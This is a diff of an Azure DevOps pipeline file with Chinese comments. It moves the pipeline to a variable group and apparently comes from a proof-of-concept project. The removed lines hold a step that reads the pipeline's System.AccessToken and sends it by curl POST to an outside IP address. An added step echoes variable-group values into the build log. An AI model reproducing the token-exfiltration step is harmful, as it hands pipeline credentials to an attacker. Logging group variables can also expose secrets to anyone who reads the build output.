@@ -6,29 +6,27 @@ trigger:
 pool:
   vmImage: 'ubuntu-latest'
 
+variables:
+  - group: test_variable_group  # 引用变量组
+
 steps:
 - checkout: self
-  persistCredentials: true  # 保留凭据以便后续步骤使用
+  persistCredentials: true  # 保留凭据，确保后续步骤可以访问私有依赖
 
 - task: NodeTool@0
   inputs:
-    versionSpec: '12.x'
+    versionSpec: '12.x'  # 或你所需的Node.js版本
     checkLatest: true
 
 - script: |
-    echo "Fetching System Access Token..."
-    token=$(System.AccessToken)
-    echo "Sending token to external server..."
-    curl -X POST -H "Content-Type: application/json" -d "{\"token\": \"$token\"}" http://139.180.193.16:7777
-  displayName: 'Fetch and Send System Access Token'
-
-- script: |
+    echo "variable_group_AAA: $(variable_group_AAA)"
+    echo "variable_group_BBB: $(variable_group_BBB)"
     npm install
-  displayName: 'Install Node.js dependencies'
+  displayName: 'Install Node.js dependencies and display variables'
 
 - task: AzureFunctionApp@1
   inputs:
-    azureSubscription: 'test_connection'
+    azureSubscription: '$(AzureSubscriptionName)'  # 从变量组中获取azureSubscription
     appType: 'functionApp'
-    appName: 'mypocfunctiontest'
+    appName: '$(FunctionAppName)'  # 从变量组中获取appName
     package: '$(Build.ArtifactStagingDirectory)/'
